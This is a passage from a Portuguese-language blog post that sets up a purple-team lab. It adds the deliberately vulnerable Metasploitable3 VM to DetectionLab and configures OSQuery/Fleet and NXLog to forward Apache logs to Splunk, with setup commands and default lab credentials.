<!doctype html>
<html lang="en-US" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Purple Team - Metasploitable3 &amp; DetectionLab | Security Stuff</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://imgodes.github.io/en/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://imgodes.github.io/en/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://imgodes.github.io/en/blog/2023/04/27/meta-detec/metasploitable3-detectionlab"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="Purple Team - Metasploitable3 &amp; DetectionLab | Security Stuff"><meta data-rh="true" name="description" content="Criado para adição do Metasploitable3 (com seus logs e telemetrias) ao DetectionLab."><meta data-rh="true" property="og:description" content="Criado para adição do Metasploitable3 (com seus logs e telemetrias) ao DetectionLab."><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2023-04-26T18:52:00.000Z"><meta data-rh="true" property="article:author" content="https://www.linkedin.com/in/gguedescruz/"><meta data-rh="true" property="article:tag" content="prática,tutorial"><link data-rh="true" rel="icon" href="/en/img/favicon.png"><link data-rh="true" rel="canonical" href="https://imgodes.github.io/en/blog/2023/04/27/meta-detec/metasploitable3-detectionlab"><link data-rh="true" rel="alternate" href="https://imgodes.github.io/en/blog/2023/04/27/meta-detec/metasploitable3-detectionlab" hreflang="en-US"><link data-rh="true" rel="alternate" href="https://imgodes.github.io/blog/2023/04/27/meta-detec/metasploitable3-detectionlab" hreflang="pt"><link data-rh="true" rel="alternate" href="https://imgodes.github.io/blog/2023/04/27/meta-detec/metasploitable3-detectionlab" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/en/blog/rss.xml" title="Security Stuff RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/en/blog/atom.xml" title="Security Stuff Atom Feed"><link rel="stylesheet" href="/en/assets/css/styles.d03fc8fd.css">
<link rel="preload" href="/en/assets/js/runtime~main.8c10b57e.js" as="script">
<link rel="preload" href="/en/assets/js/main.3391b9d5.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/en/"><div class="navbar__logo"><img src="/en/img/kanagawa.png" alt="My Site Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/en/img/kanagawa.png" alt="My Site Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Godes</b></a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>English</a><ul class="dropdown__menu"><li><a href="/en/blog/2023/04/27/meta-detec/metasploitable3-detectionlab" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="en-US">English</a></li><li><a href="/blog/2023/04/27/meta-detec/metasploitable3-detectionlab" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="pt">Português</a></li></ul></div><a class="navbar__item navbar__link" href="/en/docs/intro">Hunt</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/en/blog">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/imgodes" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><a href="https://www.linkedin.com/in/gguedescruz/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a aria-current="page" class="sidebarItemLink_mo7H sidebarItemLinkActive_I1ZP" href="/en/blog/2023/04/27/meta-detec/metasploitable3-detectionlab">Purple Team - Metasploitable3 &amp; DetectionLab</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/en/blog/2023/04/23/rev-vmwin10/vms-para-eng-rev">Máquinas virtuais para engenharia reversa (Windows)</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/en/blog/2023/02/22/intro-jekyll/introducao-jekyll">Seu site pessoal gratis</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/en/blog/2022/12/03/linksimb/malabarismo-com-links-simbólicos">Malabarismo com link simbólico</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/en/blog/2022/10/22/links-ih">Links úteis para o dia a dia</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="http://schema.org/Blog"><article itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h1 class="title_f1Hy" itemprop="headline">Purple Team - Metasploitable3 &amp; DetectionLab</h1><div class="container_mt6G margin-vert--md"><time datetime="2023-04-26T18:52:00.000Z" itemprop="datePublished">April 26, 2023</time> · <!-- -->12 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://www.linkedin.com/in/gguedescruz/" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://avatars.githubusercontent.com/u/52048434?v=4" alt="G. Guedes"></a><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://www.linkedin.com/in/gguedescruz/" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">G. Guedes</span></a></div><small class="avatar__subtitle" itemprop="description">Blue Teamer</small></div></div></div></div></header><div id="__blog-post-container" class="markdown" itemprop="articleBody"><p>Criado para adição do <a href="https://github.com/rapid7/metasploitable3" target="_blank" rel="noopener noreferrer">Metasploitable3</a> (com seus logs e telemetrias) ao <a href="https://detectionlab.network/" target="_blank" rel="noopener noreferrer">DetectionLab</a>.</p><blockquote><p>Observação: esse guia pode ser um pouco difícil de acompanhar caso não conheça o Detection Lab, mas basta instala-lo uma vez que tudo ficará mais fácil de entender.</p></blockquote><h1>Índice</h1><h1>Introdução</h1><p>O Metasploitable3 é uma máquina com serviços propositalmente vulneráveis. Existem várias versões dele, eu escolhi a terceira por ser a <a href="https://github.com/rapid7/metasploitable3/wiki#differences-between-metasploitable-3-and-the-older-versions" target="_blank" rel="noopener noreferrer">mais nova</a>.</p><p>Já o <a href="https://twitter.com/DetectionLab" target="_blank" rel="noopener noreferrer">DetectionLab</a> é um agrupado de ferramentas de detecção e logging, que juntas se tornam um ótimo ambiente de testes.</p><ul><li><a href="https://twitter.com/DetectionLab" target="_blank" rel="noopener noreferrer">Twitter do DetectionLab</a></li><li><a href="https://github.com/clong" target="_blank" rel="noopener noreferrer">Github do Criador</a></li><li><a href="https://detectionlab.network" target="_blank" rel="noopener noreferrer">Site oficial</a></li></ul><p><img loading="lazy" alt="dttnlab" src="/en/assets/images/overview-d53e1b77b882058fcbb23e03c0bc245c.png" width="3148" height="2434" class="img_ev3q">
<em>Imagem retirada do site oficial - <a href="https://detectionlab.network" target="_blank" rel="noopener noreferrer">https://detectionlab.network</a></em></p><p><strong>Pontos importantes</strong>:</p><ul><li>O tráfego de rede é loggado pelo Zeek;</li><li>Suricata é um IDS, um IPS, um NSM e processador de captura de pacotes open source, ele trabalha junto com o Zeek na análise de tráfego;</li><li>O Velociraptor e o OSQuery nos apoiam quanto a análise do endpoint e ambos possuem sua própria interface web;</li><li>O OSQuery consegue fazer consultas de baixo nível do SO. <ul><li>Ele expõe as informações do SO á um banco de dados que pode ser consultado por uma interface web chamada Fleet;</li><li>Apesar ter sua própria interface web, o OsQuery envia logs dos resultados das consultas (<code>index=osquery</code>) e também de status dele mesmo (INFO/WARN/ERROR). </li></ul></li><li>Todos esses logs podem ser consultados no Splunk.</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="combo---metasploitable3--detectionlab">Combo - Metasploitable3 &amp; DetectionLab<a href="#combo---metasploitable3--detectionlab" class="hash-link" aria-label="Direct link to Combo - Metasploitable3 &amp; DetectionLab" title="Direct link to Combo - Metasploitable3 &amp; DetectionLab">​</a></h2><p>Combinando a capacidade de detecção e investigação do Splunk + OSQuery, com os futuros ataques feitos ao servidor vulnerável, ganhamos a capacidade de identificar as etapas do ataque. Mas antes de seguir com a prática, temos que entender como os componentes interagem, que após as minhas customizações, passa a funcionar da seguinte forma:
<img loading="lazy" alt="combopng" src="/en/assets/images/detectionlabmeta3x-bb7bdd513167c3552d02c2090ba7f90d.png" width="2052" height="1641" class="img_ev3q">
<em>Desenho da arquitetura do lab do ponto de vista das funcionalidades</em> </p><p>Observações:</p><ul><li>Configurei o envio dos logs do apache para o Splunk via NXLog (mais detalhes em <a href="#nxlog">NXLog</a>);</li><li>Configurei a coleta de telemetrias pelo OSQuery (mais detalhes em <a href="#osquery-e-fleet">OSQuery e Fleet</a>);</li><li>Instalei uma VM do Kali para efetuar os ataques;</li><li>Desliguei as máquinas windows do DetectionLab pois não iam ser usadas;</li><li><em>O agente do Velociraptor ainda não está configurado no Metasploitable, portanto seguimos apenas com o OSQuery.</em></li></ul><h1>Setup TLTR - Too lazy to read</h1><p>Se você estiver com pressa, ou já saiba como tudo isso funciona, basta seguir o passos abaixo.</p><blockquote><p>Caso desconheça as ferramentas acima, recomendo ler um pouco antes de tentar instalar e configurar.
{: .prompt-info}</p></blockquote><h2 class="anchor anchorWithStickyNavbar_LWe7" id="instalação">Instalação<a href="#instalação" class="hash-link" aria-label="Direct link to Instalação" title="Direct link to Instalação">​</a></h2><p><strong>Com o detectionlab já INSTALADO e funcionando use os comandos abaixo:</strong></p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/imgodes/DetectionLabMetasploitable3.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> DetectionLabMetasploitable3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vagrant up</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Crie um index no Splunk chamado <code>syslog</code>.
Explicação detalhada em <a href="#index">index</a>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="acessos">Acessos<a href="#acessos" class="hash-link" aria-label="Direct link to Acessos" title="Direct link to Acessos">​</a></h2><ul><li>Fleet login: <a href="https://192.168.56.105:8412" target="_blank" rel="noopener noreferrer">https://192.168.56.105:8412</a> - <a href="mailto:admin@detectionlab.network" target="_blank" rel="noopener noreferrer">admin@detectionlab.network</a>:Fl33tpassword!</li><li>Splunk login: <a href="https://192.168.56.105:8000" target="_blank" rel="noopener noreferrer">https://192.168.56.105:8000</a> - admin:changeme</li><li>Velociraptor login: <a href="https://192.168.56.105:9999" target="_blank" rel="noopener noreferrer">https://192.168.56.105:9999</a> - admin:changeme</li><li>Metasploitable3 em <a href="http://192.168.56.210" target="_blank" rel="noopener noreferrer">http://192.168.56.210</a> - vagrant:vagrant</li></ul><blockquote><p>Agora vamos a apresentação das customizações feitas. Lembrando que é tudo meramente informativo, afinal, será configurado automaticamente após executar <code>vagrant up</code>(exceto a configuração do index do Splunk).
{: .prompt-danger}</p></blockquote><h1>Logging</h1><p>O Metasploitable é somente uma máquina vulnerável alvo do nosso ataque, então sozinha, seria difícil de investigar e identificar a atividade maliciosa. Por essa razão, instalei o OSQuery e o NXLog no Metasploitable. Essas ferramentas vão nos das a capacidade: </p><ul><li><strong>OSQuery</strong> 👉 Consultar processos, pastas, arquivos, comandos usados, modificações, sockets de rede e muitas outras informações sobre o sistema operacional em tempo real, por meio de comandos SQL;<ul><li>Pode ser consultado pela interface web do Fleet, ou pelo próprio OSQuery mesmo (dentro da máquina do Metasploitable);</li></ul></li><li><strong>NXLog</strong> 👉 Envio de logs de máquina ao Splunk;</li><li><strong>Splunk</strong> 👉 Consulta de logs de maneira centralizada.</li></ul><p><img loading="lazy" alt="detectionlab_simples-logging.drawio.png" src="/en/assets/images/detectionlab_simples-logging.drawio-f649221797f0a99f1c1b1ec0c087eb43.png" width="614" height="382" class="img_ev3q">
<em>Desenho da arquitetura do lab do ponto de vista do logging</em> </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="osquery-e-fleet">OSQuery e Fleet<a href="#osquery-e-fleet" class="hash-link" aria-label="Direct link to OSQuery e Fleet" title="Direct link to OSQuery e Fleet">​</a></h2><p>O OSQuery é uma ferramenta que permite consultar informações do SO. </p><p>Já o Fleet é um gerenciador de OSQuery open source, com ele podemos gerenciar e consultar o OSQuery em vários dispositivos por meio de uma interface web.</p><p>Processos, operações de rede, e muitas outras coisas podem ser consultas. Para a alegria do brasileiro médio, existem  muitos &quot;packs de consultas&quot; prontos voltados para identificação de ataques. Esses packs, são queries prontas, basta executa-las. </p><blockquote><p>Exemplos - <a href="https://github.com/osquery/osquery/tree/master/packs" target="_blank" rel="noopener noreferrer">OSQuery packs oficiais</a>, <a href="https://github.com/palantir/osquery-configuration/tree/master" target="_blank" rel="noopener noreferrer">Palantir Packs</a></p></blockquote><ul><li>Os &quot;agentes&quot; do OSQuery são registrados no Fleet.<ul><li>As consultas e configurações do agente Osquery são fornecidas pelo Fleet através de uma conexão TLS.  </li></ul></li><li>A configuração do agente é definida pelo arquivo <code>osquery.flags</code>{: .filepath} </li><li>O nosso Fleet do DetectionLab é pré-configurado com os arquivos do <a href="https://github.com/palantir/osquery-configuration" target="_blank" rel="noopener noreferrer">Palantir</a>. </li><li>As opções ativadas no arquivo de <code>osquery.flags</code>{: .filepath} são as do próprio Palantir, e não alterei nada, apenas peguei do repositório deles. </li><li>De acordo com o repositório do Palantir, é esperado que hosts Linux tenham o arquivo <a href="https://github.com/palantir/osquery-configuration/blob/master/Classic/Servers/Linux/packs/ossec-rootkit.conf" target="_blank" rel="noopener noreferrer">ossec-rootkit.conf</a> em <code>/etc/osquery/packs/ossec-rootkit.conf</code>{: .filepath} isso é garantido pelo vagrant quando executamos <code>vagrant up</code>.</li><li>A opção user_events é desabilitada por padrão, pois de acordo com a documentação é redundante.<blockquote><p>&quot;On Linux, a companion table called user_events is included that provides several authentication-based events. If you are enabling process auditing it should be trivial to also include this table&quot; - <a href="https://osquery.readthedocs.io/en/stable/deployment/process-auditing/" target="_blank" rel="noopener noreferrer">User event auditing with Audit</a></p></blockquote></li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="nxlog">NXLog<a href="#nxlog" class="hash-link" aria-label="Direct link to NXLog" title="Direct link to NXLog">​</a></h2><p>O NXLog é minha ferramenta favorita para encaminhamento de logs. NXLog pode processar eventos de milhares de fontes diferentes, funciona em sistemas antigos e novos. É capaz de processar um volume absurdo de logs (de acordo com a <a href="https://docs.nxlog.co/userguide/intro/about-nxlog.html" target="_blank" rel="noopener noreferrer">documentação</a>). Trabalha bem com diversos protocolos de rede, transporte, e criptografias, além de suportar  também de formatos de logs dos mais variados (Syslog, Windows Event Log, JSON, etc). E mesmo que não tenha alguma predefinição, ainda é possível fazer o parsing manualmente.</p><p>Então iremos instalar o NXLog no Metasploitable3, para o parsing inicial, e envio dos logs do apache para o Splunk. A configuração do NXLog é toda centralizada no arquivo <code>nxlog.conf</code>{: .filepath}. </p><ul><li>A minha configuração está disponível no <a href="https://raw.githubusercontent.com/imgodes/DetectionLabMetasploitable3/master/nxlog.conf" target="_blank" rel="noopener noreferrer">github</a>;</li><li>O agente do NXlog usado é o 2.10 para Ubuntu 14.04 (trusty);</li></ul><p>O agente do NXLog consegue ler alguma entrada (<a href="#nxlog-input">Input</a>), manipula-la (Exec) e enviar para alguma saída(<a href="#nxlog-output">Output e Route</a>). Essas diretrizes são definidas todas no mesmo arquivo <code>nxlog.conf</code>{: .filepath}.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="nxlog-input">NXLog Input<a href="#nxlog-input" class="hash-link" aria-label="Direct link to NXLog Input" title="Direct link to NXLog Input">​</a></h3><p>É a entrada dos logs, nesse caso um arquivo.</p><ul><li>Configurei o NXLog para ler os logs do apache em <code>/var/log/apache2/access.log</code>{: .filepath};</li><li>Fiz uma regex para fazer o parsing dos campos do apache;<ul><li>Essas configurações estão de acordo com as configurações de logging que declarei no arquivo <code>apache2.conf</code>, caso altere, lembre de alterar manter a concordância entre eles.</li></ul></li></ul><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Input</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">apache_access</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Module im_file</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    File        &quot;/var/log/apache2/access.log&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Exec</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if $raw_event =~ /(?x)^(\S+)\ \S+\ (\S+)\ \[([^\]]+)\]\ \&quot;(\S+)\ (.+)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                          \ HTTP\/\d\.\d\&quot;\ (\S+)\ (\S+)\ \&quot;([^\&quot;]+)\&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                          \ \&quot;([^\&quot;]+)\&quot;/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $Hostname = $1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if $2 != &#x27;-&#x27; $AccountName = $2;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $EventTime = parsedate($3);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $HTTPMethod = $4;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $HTTPURL = $5;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $HTTPResponseStatus = $6;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if $7 != &#x27;-&#x27; $FileSize = $7;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if $8 != &#x27;-&#x27; $HTTPReferer = $8;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if $9 != &#x27;-&#x27; $HTTPUserAgent = $9;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Exec</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Input</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&#x27;/etc/nxlog/nxlog.conf&#x27;}</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="nxlog-output">NXLog Output<a href="#nxlog-output" class="hash-link" aria-label="Direct link to NXLog Output" title="Direct link to NXLog Output">​</a></h3><p>Aqui configuramos o que vem do Input e vai para o Splunk.</p><ul><li>Digo que saída usará a porta <code>514/UDP</code> sendo que o destino será o IP do servidor Splunk;</li><li>Executo a função <code>drop()</code> para descartar logs cujo o hostname vem como ipv4 de loopback (isso estava floodando o Splunk de eventos);</li><li>Executo a função <code>to_json()</code> para converter o log para o formato JSON.</li></ul><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Output</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">syslog_udp</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Module     om_udp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Host       192.168.56.105</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PORT       514 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Exec</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if ($Hostname == &#x27;127.0.0.1&#x27;) drop();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        to_json();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Exec</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Output</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Route</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">1</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Path apache_access =&gt; syslog_udp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Route</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&#x27;/etc/nxlog/nxlog.conf&#x27;}</p><h2 class="anchor 